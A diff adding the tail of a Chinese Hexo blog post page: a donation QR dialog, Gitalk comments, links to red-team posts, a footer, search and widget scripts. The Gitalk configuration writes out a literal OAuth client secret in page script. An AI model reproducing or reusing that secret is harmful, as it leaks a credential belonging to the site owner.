+        inset: 0;
+        cursor: pointer;
+        background: rgba(15, 20, 18, 0.62);
+        backdrop-filter: blur(3px);
+        -webkit-backdrop-filter: blur(3px);
+    }
+
+    .reward-dialog-panel {
+        position: relative;
+        z-index: 1;
+        width: min(620px, 94vw);
+        max-height: calc(100vh - 36px);
+        padding: 26px 28px 24px;
+        overflow: auto;
+        border-radius: 16px;
+        background: #fff;
+        box-shadow: 0 24px 80px rgba(0, 0, 0, 0.3);
+        outline: 0;
+        transform: translateY(12px) scale(0.98);
+        transition: transform 180ms ease;
+    }
+
+    .reward-dialog.is-open .reward-dialog-panel {
+        transform: translateY(0) scale(1);
+    }
+
+    .reward-dialog-close {
+        position: absolute;
+        top: 10px;
+        right: 12px;
+        width: 38px;
+        height: 38px;
+        padding: 0;
+        color: #555;
+        font-size: 28px;
+        line-height: 34px;
+        cursor: pointer;
+        border: 0;
+        border-radius: 50%;
+        background: transparent;
+    }
+
+    .reward-dialog-close:hover,
+    .reward-dialog-close:focus-visible {
+        color: #fff;
+        background: #ef5350;
+    }
+
+    .reward-dialog-title {
+        padding: 0 34px;
+        margin: 0 0 8px;
+        color: #333;
+        font-size: 1.5rem;
+        line-height: 1.4;
+        text-align: center;
+    }
+
+    .reward-dialog-tip {
+        margin: 0 0 20px;
+        color: #777;
+        font-size: 0.92rem;
+        text-align: center;
+    }
+
+    .reward-methods {
+        display: grid;
+        grid-template-columns: repeat(2, minmax(0, 1fr));
+        gap: 18px;
+    }
+
+    .reward-method {
+        padding: 14px;
+        margin: 0;
+        border: 1px solid #ececec;
+        border-radius: 12px;
+        background: #fafafa;
+    }
+
+    .reward-qr-frame {
+        display: flex;
+        aspect-ratio: 1 / 1;
+        align-items: center;
+        justify-content: center;
+        overflow: hidden;
+        border-radius: 8px;
+        background: #fff;
+    }
+
+    .reward-qr {
+        display: block;
+        width: 100%;
+        height: 100%;
+        object-fit: contain;
+    }
+
+    .reward-qr[hidden] {
+        display: none !important;
+    }
+
+    .reward-qr-missing {
+        padding: 20px;
+        color: #999;
+        line-height: 1.7;
+        text-align: center;
+    }
+
+    .reward-method figcaption {
+        margin-top: 10px;
+        color: #444;
+        font-size: 1rem;
+        font-weight: 600;
+        text-align: center;
+    }
+
+    body.reward-dialog-open {
+        overflow: hidden;
+    }
+
+    @media only screen and (max-width: 600px) {
+        .reward-dialog-panel {
+            padding: 24px 18px 20px;
+        }
+
+        .reward-methods {
+            grid-template-columns: 1fr;
+        }
+
+        .reward-method {
+            width: min(100%, 270px);
+            margin: 0 auto;
+        }
+    }
+
+    @media (prefers-reduced-motion: reduce) {
+        .reward-dialog,
+        .reward-dialog-panel,
+        #reward .reward-open {
+            transition: none;
+        }
+    }
+</style>
+
+<div id="reward">
+    <button id="rewardOpen" class="reward-open" type="button" aria-haspopup="dialog" aria-controls="rewardDialog" title="打开打赏二维码">赏</button>
+</div>
+
+<div id="rewardDialog" class="reward-dialog" hidden>
+    <div class="reward-dialog-backdrop" data-reward-close aria-hidden="true"></div>
+    <section class="reward-dialog-panel" role="dialog" aria-modal="true" aria-labelledby="rewardDialogTitle" tabindex="-1">
+        <button class="reward-dialog-close" type="button" data-reward-close aria-label="关闭打赏窗口" title="关闭">×</button>
+        <h4 id="rewardDialogTitle" class="reward-dialog-title">你的赏识是我前进的动力</h4>
+        <p class="reward-dialog-tip">请选择支付宝或微信扫码支持</p>
+        <div class="reward-methods">
+            <figure class="reward-method">
+                <div class="reward-qr-frame">
+                    <img src="/medias/reward/aliyunpay.png" class="reward-qr" alt="支付宝打赏二维码" loading="lazy" decoding="async">
+                    <div class="reward-qr-missing" hidden>支付宝二维码暂未配置</div>
+                </div>
+                <figcaption>支付宝</figcaption>
+            </figure>
+            <figure class="reward-method">
+                <div class="reward-qr-frame">
+                    <img src="/medias/reward/wechat1.png" class="reward-qr" alt="微信打赏二维码" loading="lazy" decoding="async">
+                    <div class="reward-qr-missing" hidden>微信二维码暂未配置</div>
+                </div>
+                <figcaption>微信</figcaption>
+            </figure>
+        </div>
+    </section>
+</div>
+
+<script>
+    (function () {
+        var openButton = document.getElementById('rewardOpen');
+        var dialog = document.getElementById('rewardDialog');
+        if (!openButton || !dialog) return;
+
+        var panel = dialog.querySelector('.reward-dialog-panel');
+        var closeButtons = dialog.querySelectorAll('[data-reward-close]');
+        var lastFocused = null;
+        var closeTimer = 0;
+
+        document.body.appendChild(dialog);
+
+        dialog.querySelectorAll('.reward-qr').forEach(function (image) {
+            function showMissing() {
+                image.hidden = true;
+                var message = image.nextElementSibling;
+                if (message) message.hidden = false;
+            }
+
+            image.addEventListener('error', showMissing);
+            if (image.complete && image.naturalWidth === 0) showMissing();
+        });
+
+        function openDialog() {
+            window.clearTimeout(closeTimer);
+            lastFocused = document.activeElement;
+            dialog.hidden = false;
+            document.body.classList.add('reward-dialog-open');
+            window.requestAnimationFrame(function () {
+                dialog.classList.add('is-open');
+                panel.focus();
+            });
+        }
+
+        function closeDialog() {
+            dialog.classList.remove('is-open');
+            document.body.classList.remove('reward-dialog-open');
+            closeTimer = window.setTimeout(function () {
+                dialog.hidden = true;
+                if (lastFocused && typeof lastFocused.focus === 'function') lastFocused.focus();
+            }, 180);
+        }
+
+        openButton.addEventListener('click', openDialog);
+        closeButtons.forEach(function (button) {
+            button.addEventListener('click', closeDialog);
+        });
+        document.addEventListener('keydown', function (event) {
+            if (event.key === 'Escape' && !dialog.hidden) closeDialog();
+        });
+    }());
+</script>
+
+            
+        </div>
+    </div>
+
+    
+        <!-- Gitalk is bundled with the theme to avoid a blocking overseas CDN request. -->
+<link rel="stylesheet" href="/libs/gitalk/gitalk.css">
+
+<!-- 引入主题自定义 CSS（如有需要，若 my-gitalk.css 是本地文件则保留原路径） -->
+<link rel="stylesheet" href="/css/my-gitalk.css">
+
+<div class="card gitalk-card" data-aos="fade-up">
+  <div class="comment_headling">
+    <i class="fas fa-comments fa-fw"></i>
+    <span>评论</span>
+  </div>
+  <div id="gitalk-container" class="card-content"></div>
+</div>
+
+<script>
+  (function () {
+    var container = document.getElementById('gitalk-container');
+    var loaded = false;
+    if (!container) return;
+
+    function renderGitalk() {
+      var gitalk = new Gitalk({
+        clientID: 'Ov23liTNlK9NLcZwFSo8',
+        clientSecret: '7472cd54d6ca5e38d14f6d1b5176299bb4cf4ebe',
+        repo: 'blog---comments',
+        owner: 'web-wuk0Ng',
+        admin: ["web-wuk0Ng"],
+        id: '2026-10-30T20-20-00',
+        distractionFreeMode: false
+      });
+      gitalk.render('gitalk-container');
+    }
+
+    function loadGitalk() {
+      if (loaded) return;
+      loaded = true;
+      var script = document.createElement('script');
+      script.src = '/libs/gitalk/gitalk.min.js';
+      script.async = true;
+      script.onload = renderGitalk;
+      document.head.appendChild(script);
+    }
+
+    if ('IntersectionObserver' in window) {
+      var observer = new IntersectionObserver(function (entries) {
+        if (entries.some(function (entry) { return entry.isIntersecting; })) {
+          observer.disconnect();
+          loadGitalk();
+        }
+      }, { rootMargin: '500px 0px' });
+      observer.observe(container);
+    } else {
+      window.addEventListener('load', loadGitalk, { once: true });
+    }
+  }());
+</script>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles home-title-grid compact-prenext-grid">
+    <div class="row article-row">
+        <div class="article home-title-card col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a class="home-title-link" href="/2026/10/30/MSF&CS%E4%BB%8B%E7%BB%8D%E4%B8%8E%E4%BD%BF%E7%94%A8/" aria-label="阅读：MSF&amp;CS介绍与使用">
+                    <h2>MSF&amp;CS介绍与使用</h2>
+                </a>
+                
+                <div class="compact-card-tags" aria-label="文章标签">
+                    
+                    <a href="/tags/%E7%BA%A2%E9%98%9F/" class="compact-card-tag">#红队</a>
+                    
+                    <a href="/tags/%E5%86%85%E7%BD%91/" class="compact-card-tag">#内网</a>
+                    
+                </div>
+                
+            </div>
+        </div>
+
+        <div class="article home-title-card col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a class="home-title-link" href="/2026/10/26/java%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" aria-label="阅读：java模板注入">
+                    <h2>java模板注入</h2>
+                </a>
+                
+                <div class="compact-card-tags" aria-label="文章标签">
+                    
+                    <a href="/tags/java/" class="compact-card-tag">#java</a>
+                    
+                    <a href="/tags/%E7%BA%A2%E9%98%9F/" class="compact-card-tag">#红队</a>
+                    
+                </div>
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h1, h2, h3'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h1, h2, h3').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2026</span>
+            
+            <a href="/about" target="_blank">wuk0Ng</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color">加载中…</span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color">加载中…</span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/web-wuk0Ng" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:3134985131@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=3442584626" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 3442584626" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+    <aside id="linDesktopPet" class="lin-desktop-pet" aria-label="林翩翩桌宠">
+    <div class="lin-pet-bubble" role="status" aria-live="polite">这儿……便是你的住处？</div>
+    <div class="lin-pet-effects" aria-hidden="true"></div>
+    <button class="lin-pet-character" type="button" aria-label="和林翩翩互动" title="点击互动，也可以拖动">
+        <img src="/medias/lin-pianpian/official-desktop-pet.webp" alt="林翩翩桌宠" width="576" height="703" loading="lazy" decoding="async" fetchpriority="low">
+    </button>
+</aside>
+
+<script src="/js/desktop-pet.js?v=20260824-2" defer fetchpriority="low"></script>
+
+
+    <script src="/libs/materialize/materialize.min.js" defer fetchpriority="low"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js" defer fetchpriority="low"></script>
+    <script src="/libs/aos/aos.js" defer fetchpriority="low"></script>
+    
+    <script src="/libs/scrollprogress/scrollProgress.min.js" defer fetchpriority="low"></script>
+    
+    
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js" defer fetchpriority="low"></script>
+    
+    <script src="/js/matery.js?v=20260824-speed1" defer fetchpriority="low"></script>
+
+    <!-- Baidu Analytics -->
+
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        if (/^(localhost|127\.0\.0\.1)$/.test(window.location.hostname)) return;
+
+        function loadBaiduPush() {
+            var bp = document.createElement('script');
+            bp.async = true;
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+            document.head.appendChild(bp);
+        }
+
+        if ('requestIdleCallback' in window) {
+            window.requestIdleCallback(loadBaiduPush, { timeout: 4500 });
+        } else {
+            window.addEventListener('load', function () {
+                window.setTimeout(loadBaiduPush, 1800);
+            }, { once: true });
+        }
+    })();
+</script>
+
+
+    
+    <script src="/libs/others/clicklove.js" async></script>
+    
+    
+    <script src="/libs/others/busuanzi.pure.mini.js?v=20261026-stats1" async></script>
+    
+
+    
+
+    
+
+	
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
